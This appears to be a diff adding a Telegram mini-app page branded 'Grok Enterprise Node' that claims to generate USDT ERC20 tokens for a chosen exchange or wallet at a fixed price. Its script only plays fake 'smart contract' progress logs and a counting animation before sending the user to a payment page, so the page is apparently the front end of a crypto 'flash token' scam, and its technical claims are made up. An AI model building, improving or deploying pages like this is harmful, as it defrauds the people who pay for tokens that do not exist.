@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Grok Enterprise Node - Mobile Optimized</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary: #ffffff;
+            --bg-dark: #000000;
+            --input-border: rgba(255, 255, 255, 0.3); 
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-dark);
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            user-select: none;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .app-overlay { 
+            position: fixed; 
+            inset: 0; 
+            background: radial-gradient(circle at 50% -10%, #333 0%, #000 80%); 
+            z-index: 1; 
+        }
+
+        .no-scrollbar::-webkit-scrollbar { display: none; }
+
+        .content-container {
+            position: relative;
+            background-image: url('background.png'); 
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            border-radius: 25px 25px 0 0;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 -10px 40px rgba(0,0,0,1);
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            padding-bottom: env(safe-area-inset-bottom);
+            margin-top: 100px; /* زيادة الهامش لترك مساحة للاسم فوق البروفايل */
+            overflow: visible; 
+            z-index: 2;
+        }
+
+        .content-inner {
+            position: relative;
+            z-index: 5;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            padding: 18px; 
+            padding-top: 65px; 
+        }
+
+        .remix-input {
+            background: rgba(0, 0, 0, 0.6); 
+            border: 1.5px solid var(--input-border);
+            color: #ffffff;
+            transition: all 0.2s ease;
+            backdrop-filter: blur(8px);
+            padding: 12px 15px; 
+            border-radius: 14px;
+            cursor: pointer;
+        }
+        
+        .remix-input:active { transform: scale(0.97); }
+
+        .wallet-container {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1.5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 14px;
+            padding: 12px 15px; 
+            backdrop-filter: blur(8px);
+        }
+
+        .ui-btn {
+            padding: 16px; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: 800;
+            font-size: 13px;
+            background: #000;
+            border: 1.5px solid rgba(255, 255, 255, 0.4);
+            border-radius: 16px;
+            width: 100%;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            transition: all 0.3s ease;
+        }
+
+        .ui-btn.ready {
+            background: #ffffff;
+            color: #000;
+            border-color: #ffffff;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.4);
+        }
+
+        /* Profile & Name Area */
+        .profile-wrapper {
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translate(-50%, -60%);
+            z-index: 100;
+            width: 140px; 
+            height: 140px; 
+            pointer-events: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .user-info-header {
+            position: absolute;
+            top: -45px; /* وضع الاسم فوق البروفايل */
+            left: 50%;
+            transform: translateX(-50%);
+            text-align: center;
+            width: 200px;
+        }
+
+        .profile-frame {
+            position: absolute;
+            inset: 0;
+            background-image: url('frame.png');
+            background-size: contain;
+            background-position: center;
+            background-repeat: no-repeat;
+            z-index: 10;
+        }
+
+        .profile-pic-container {
+            position: relative;
+            z-index: 5;
+            width: 80px; 
+            height: 80px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 2px solid rgba(255, 255, 255, 0.15);
+            background: #000;
+        }
+
+        .gift-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: 1.5px solid rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            width: 45px;
+            height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            animation: shakeGift 1.2s infinite ease-in-out;
+            position: fixed;
+            top: 5rem;
+            right: 20px;
+            z-index: 1000;
+        }
+
+        @keyframes shakeGift {
+            0% { transform: rotate(0deg) scale(1); }
+            10% { transform: rotate(20deg) scale(1.1); }
+            20% { transform: rotate(-20deg) scale(1.1); }
+            30% { transform: rotate(20deg) scale(1.1); }
+            40% { transform: rotate(-20deg) scale(1.1); }
+            50% { transform: rotate(0deg) scale(1.1); }
+            100% { transform: rotate(0deg) scale(1); }
+        }
+
+        #processingModal, #giftModal, #freeCheckModal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.98);
+            z-index: 3000;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+        }
+
+        .bottom-sheet {
+            position: fixed;
+            bottom: -100%;
+            left: 0;
+            right: 0;
+            background: #0a0a0a;
+            border-top: 2px solid rgba(255, 255, 255, 0.4);
+            border-radius: 25px 25px 0 0;
+            z-index: 501;
+            transition: bottom 0.4s cubic-bezier(0.32, 0.72, 0, 1);
+            max-height: 65vh;
+            overflow-y: auto;
+        }
+
+        .bottom-sheet.active { bottom: 0; }
+
+        .option-item {
+            padding: 16px 20px; 
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="app-overlay"></div>
+
+    <div id="processingModal">
+        <div class="w-20 h-20 mb-4 relative">
+            <div class="absolute inset-0 border-4 border-white/20 rounded-full animate-spin"></div>
+            <img src="erc.gif" class="w-full h-full object-contain rounded-full">
+        </div>
+        <div class="space-y-3 mb-4 w-full max-w-xs text-center">
+            <div id="log1" class="text-[10px] font-black tracking-widest text-white/40 uppercase">Calling REMIX IDE 0.54.0 Database...</div>
+            <div id="log2" class="text-[10px] font-black tracking-widest text-white/40 uppercase">Confirming Network...</div>
+            <div id="log3" class="text-[10px] font-black tracking-widest text-white/40 uppercase">Call Smartcontract solidity 18 decimal...</div>
+            <div id="log4" class="text-[10px] font-black tracking-widest text-white/40 uppercase">Confirm Platform: <span id="platformLog" class="text-white">-</span></div>
+        </div>
+        <div id="counterSection" class="hidden text-center">
+            <div id="assetCounter" class="text-5xl font-black text-white tracking-tighter mb-1">0</div>
+            <div class="text-[9px] text-white/40 uppercase tracking-widest">USDT ERC20 GENERATED</div>
+        </div>
+        <button id="confirmOrderBtn" class="hidden w-full max-w-xs mt-6 py-4 bg-white text-black font-black rounded-xl text-[12px] uppercase tracking-widest animate-pulse">
+            Confirm Order
+        </button>
+    </div>
+
+    <div id="giftModal">
+        <div class="bg-[#0f0f0f] border-2 border-white/30 p-8 rounded-[30px] text-center max-w-[300px] shadow-2xl">
+            <div class="text-5xl mb-4">🎁</div>
+            <h2 class="text-white font-black text-2xl mb-2 uppercase tracking-tighter">Special Offer</h2>
+            <p class="text-white/80 text-[11px] mb-3 uppercase tracking-wider leading-relaxed font-bold">
+                GET <span class="text-white underline decoration-white/50">80% DISCOUNT</span> FOR 1 MONTH ON ALL NODES
+            </p>
+            <p class="text-white/60 text-[9px] mb-4 font-black uppercase tracking-widest border-t border-white/10 pt-3">
+                YOU GET 1 CODE EVERY MONTH AFTER PURCHASE
+            </p>
+            <button onclick="document.getElementById('giftModal').style.display='none'" class="w-full py-3 bg-white text-black font-black rounded-lg uppercase text-[12px] tracking-widest active:scale-95">Claim Now</button>
+        </div>
+    </div>
+
+    <div class="flex-1 flex flex-col relative z-10 w-full">
+        <div class="h-[70px] flex items-center justify-center px-5 pt-4">
+             <button onclick="document.getElementById('giftModal').style.display='flex'" class="gift-btn">🎁</button>
+        </div>
+
+        <div class="content-container">
+            <div class="profile-wrapper">
+                <div class="user-info-header">
+                    <h2 id="userName" class="text-white text-[15px] font-black uppercase tracking-tight">REMIX NODE</h2>
+                    <span class="text-white/50 font-mono text-[9px] font-black border border-white/10 px-1.5 py-0.5 rounded">KRNL-V2.0.0</span>
+                </div>
+                <div class="profile-frame"></div>
+                <div class="profile-pic-container">
+                    <img id="userPhoto" src="https://ui-avatars.com/api/?name=Remix&background=000&color=fff" class="w-full h-full object-cover" alt="Profile">
+                </div>
+            </div>
+
+            <div class="content-inner">
+                <div class="flex-1 space-y-4 overflow-y-auto no-scrollbar">
+                    
+                    <div onclick="toggleFreeCheck(true)" class="bg-white/5 border-2 border-white/30 p-4 rounded-xl flex items-center justify-between active:scale-95 transition-all">
+                        <div class="flex items-center gap-2">
+                            <span class="text-white text-sm font-black animate-pulse">»</span>
+                            <h3 class="text-white text-[11px] font-black italic tracking-wide">FREE STATUS CHECK</h3>
+                        </div>
+                        <span class="text-white/30 text-[10px] font-bold">VIEW ›</span>
+                    </div>
+
+                    <div class="space-y-1.5">
+                        <label class="text-[9px] font-black text-white/60 uppercase ml-1 flex items-center gap-2">
+                            <span>ERC20 ADDRESS</span>
+                            <div class="h-1 w-1 rounded-full bg-green-500 animate-pulse"></div>
+                        </label>
+                        <div class="wallet-container flex items-center gap-2">
+                            <img src="usdt.png" class="w-5 h-5" id="walletImg" onerror="this.style.opacity=0.3">
+                            <input type="text" id="walletInput" class="bg-transparent border-none text-white w-full text-[12px] outline-none font-black placeholder:text-white/30" placeholder="ENTER ETHEREUM ADDRESS">
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-3">
+                        <div class="space-y-1.5">
+                            <label class="text-[9px] font-black text-white/60 uppercase ml-1">NODE CORE</label>
+                            <button id="coreSheetTrigger" class="w-full remix-input flex items-center justify-between text-[11px] font-black">
+                                <span id="selectedCoreText" class="text-white/40">Core</span>
+                                <span class="text-white/30">▾</span>
+                            </button>
+                        </div>
+                        <div class="space-y-1.5">
+                            <label class="text-[9px] font-black text-white/60 uppercase ml-1">VOLUME</label>
+                            <button id="amountSheetTrigger" class="w-full remix-input flex items-center justify-between text-[11px] font-black">
+                                <span id="selectedAmountText" class="text-white/40">USDT</span>
+                                <span class="text-white/30">▾</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="space-y-1.5">
+                        <label class="text-[9px] font-black text-white/60 uppercase ml-1">REFERRAL CODE</label>
+                        <div class="remix-input flex items-center gap-2 py-3">
+                            <input type="text" class="bg-transparent border-none text-white w-full text-[11px] outline-none font-black placeholder:text-white/30" placeholder="CODE (OPTIONAL)">
+                        </div>
+                    </div>
+
+                </div>
+
+                <div class="pt-4 mt-auto">
+                    <button id="authorizeBtn" disabled class="ui-btn">Deploy Smartcontract</button>
+                    <p class="text-[7px] text-center text-white/30 font-bold mt-2 uppercase tracking-widest">Grok Enterprise Core • KRNL</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="bottomSheetOverlay" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-[500] hidden"></div>
+    <div id="coreSheetOverlay" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-[500] hidden"></div>
+
+    <div id="bottomSheet" class="bottom-sheet no-scrollbar">
+        <div class="p-4 text-center border-b border-white/10 sticky top-0 bg-[#0a0a0a] z-10">
+            <span class="text-[12px] font-black uppercase text-white">Select Volume</span>
+        </div>
+        <div id="amountOptionsContainer" class="p-1"></div>
+    </div>
+
+    <div id="coreSheet" class="bottom-sheet no-scrollbar">
+        <div class="p-4 text-center border-b border-white/10 sticky top-0 bg-[#0a0a0a] z-10">
+            <span class="text-[12px] font-black uppercase text-white">Select Node Core</span>
+        </div>
+        <div id="coreOptionsContainer" class="p-1"></div>
+    </div>
+
+    <div id="freeCheckModal">
+        <div class="flex items-center justify-between p-4 bg-[#0f0f0f] border-b-2 border-white/10 w-full rounded-t-2xl">
+            <span class="text-white text-xs font-black uppercase">Status</span>
+            <button onclick="toggleFreeCheck(false)" class="text-white font-bold">✕</button>
+        </div>
+        <div class="flex-1 w-full bg-white overflow-hidden rounded-b-2xl">
+            <iframe src="https://servernsjaj.onrender.com/" class="w-full h-full border-none"></iframe>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready(); tg.expand();
+
+        let isWalletConnected = false;
+        let selectedAmount = null;
+        let selectedCore = null;
+
+        const basePrice = 14.99;
+        const amounts = [100, 150, 300, 500, 1000, 2000, 3000, 4000, 5000];
+        const cores = [
+            { name: 'Binance' }, { name: 'Bybit' }, { name: 'MEXC' }, 
+            { name: '1xBet' }, { name: 'Linbet' }, { name: 'TrustWallet' },
+            { name: 'MetaMask' }, { name: 'Phantom' }, { name: 'TronLink' }, { name: 'Qoutex' }
+        ];
+
+        const user = tg.initDataUnsafe?.user;
+        if (user) {
+            document.getElementById('userName').textContent = (user.first_name + ' ' + (user.last_name || '')).toUpperCase();
+            if (user.photo_url) document.getElementById('userPhoto').src = user.photo_url;
+        }
+
+        const walletInput = document.getElementById('walletInput');
+        walletInput.addEventListener('input', (e) => {
+            isWalletConnected = /^0x[a-fA-F0-9]{40}$/.test(e.target.value.trim());
+            document.querySelector('.wallet-container').style.borderColor = isWalletConnected ? "#fff" : "rgba(255,255,255,0.3)";
+            validateAction();
+        });
+
+        function toggleFreeCheck(show) { document.getElementById('freeCheckModal').style.display = show ? 'flex' : 'none'; }
+        
+        function openSheet(id, ov) { 
+            document.getElementById(ov).classList.remove('hidden');
+            setTimeout(() => document.getElementById(id).classList.add('active'), 10);
+        }
+        
+        function closeSheet(id, ov) {
+            document.getElementById(id).classList.remove('active');
+            setTimeout(() => document.getElementById(ov).classList.add('hidden'), 400);
+        }
+
+        document.getElementById('amountSheetTrigger').onclick = () => openSheet('bottomSheet', 'bottomSheetOverlay');
+        document.getElementById('coreSheetTrigger').onclick = () => openSheet('coreSheet', 'coreSheetOverlay');
+        document.getElementById('bottomSheetOverlay').onclick = () => closeSheet('bottomSheet', 'bottomSheetOverlay');
+        document.getElementById('coreSheetOverlay').onclick = () => closeSheet('coreSheet', 'coreSheetOverlay');
+
+        amounts.forEach(amt => {
+            const price = ((amt / 100) * basePrice).toFixed(2);
+            const div = document.createElement('div');
+            div.className = 'option-item flex justify-between items-center text-white active:bg-white/10 rounded-lg';
+            div.innerHTML = `<span>${amt} USDT</span><span class="text-white/40">$${price}</span>`;
+            div.onclick = () => {
+                selectedAmount = amt;
+                document.getElementById('selectedAmountText').innerHTML = `<span class="text-white">${amt} USDT</span>`;
+                closeSheet('bottomSheet', 'bottomSheetOverlay');
+                validateAction();
+            };
+            document.getElementById('amountOptionsContainer').appendChild(div);
+        });
+
+        cores.forEach(core => {
+            const div = document.createElement('div');
+            div.className = 'option-item text-white active:bg-white/10 rounded-lg';
+            div.innerHTML = `<span class="uppercase">${core.name}</span>`;
+            div.onclick = () => {
+                selectedCore = core.name;
+                document.getElementById('selectedCoreText').innerHTML = `<span class="text-white">${core.name}</span>`;
+                closeSheet('coreSheet', 'coreSheetOverlay');
+                validateAction();
+            };
+            document.getElementById('coreOptionsContainer').appendChild(div);
+        });
+
+        function validateAction() {
+            const btn = document.getElementById('authorizeBtn');
+            if (isWalletConnected && selectedAmount && selectedCore) {
+                btn.disabled = false; btn.classList.add('ready');
+            } else {
+                btn.disabled = true; btn.classList.remove('ready');
+            }
+        }
+
+        document.getElementById('authorizeBtn').onclick = function() {
+            const modal = document.getElementById('processingModal');
+            modal.style.display = 'flex';
+            document.getElementById('platformLog').textContent = selectedCore.toUpperCase();
+            
+            ['log1', 'log2', 'log3', 'log4'].forEach((id, i) => {
+                setTimeout(() => { document.getElementById(id).classList.replace('text-white/40', 'text-white'); }, (i + 1) * 700);
+            });
+
+            setTimeout(() => {
+                document.getElementById('counterSection').classList.remove('hidden');
+                let cur = 0;
+                const timer = setInterval(() => {
+                    cur += selectedAmount/30;
+                    if(cur >= selectedAmount) {
+                        clearInterval(timer); 
+                        document.getElementById('assetCounter').textContent = selectedAmount;
+                        document.getElementById('confirmOrderBtn').classList.remove('hidden');
+                    } else { document.getElementById('assetCounter').textContent = Math.floor(cur); }
+                }, 30);
+            }, 3500);
+
+            document.getElementById('confirmOrderBtn').onclick = () => { window.location.href = `${selectedAmount}.html`; };
+        };
+    </script>
+</body>
+</html>
